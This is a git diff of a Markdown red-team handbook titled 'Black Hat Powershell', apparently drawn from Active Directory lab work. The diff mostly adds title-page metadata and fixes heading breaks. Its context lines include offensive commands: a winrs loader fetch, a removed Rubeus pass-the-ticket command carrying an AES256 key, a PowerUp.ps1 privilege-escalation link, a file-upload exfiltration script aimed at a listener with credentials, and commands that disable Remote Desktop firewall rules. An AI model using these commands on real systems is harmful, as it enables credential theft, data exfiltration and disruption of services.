@@ -1,3 +1,23 @@
+---
+title: "Black Hat Powershell"
+author: ["FBAKRI"]
+date: "2022-11-08"
+subject: "Markdown"
+keywords: [Markdown, Example]
+subtitle: "First Draft"
+lang: "en"
+titlepage: true
+titlepage-color: "B30000"
+titlepage-text-color: "FFFAFA"
+titlepage-rule-color: "FFFAFA"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
+---
+
+
+
 # Introduction
 
 ## Running Powershell
@@ -432,9 +452,8 @@ $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:80
 ```
 
 
-6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+# Privilege Escalation
 
-./Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt# Privilege Escalation
 ## PowerUp.ps1
 
 Link https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
@@ -768,9 +787,12 @@ You may want to clean up after yourself.
 
 `Remove-Item C:\Test\*.*`
 `Remove-Item C:\Users\Public\*.*`
+
 # Command and Control
+
 ## Covenant
 ## Empire
+
 # Exfiltration
 
 ## Exfiltration Over HTTP(S)
@@ -839,6 +861,7 @@ $WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
 `./upload.ps1 <https://ip:port/> <admin:password> <file (in current dir)>`
 
 `./upload.ps1 https://192.168.46.1:4433/ admin:password file_to_upload`
+
 # Impact
 
 ## Enable Disable and Stop Services
@@ -870,7 +893,9 @@ Disable the remote desktop protocol
 
 Disable remote desktop through the Windows Firewall
 
-`Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`# Active Directory
+`Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
+
+# Active Directory
 
 ## Enumeration
 
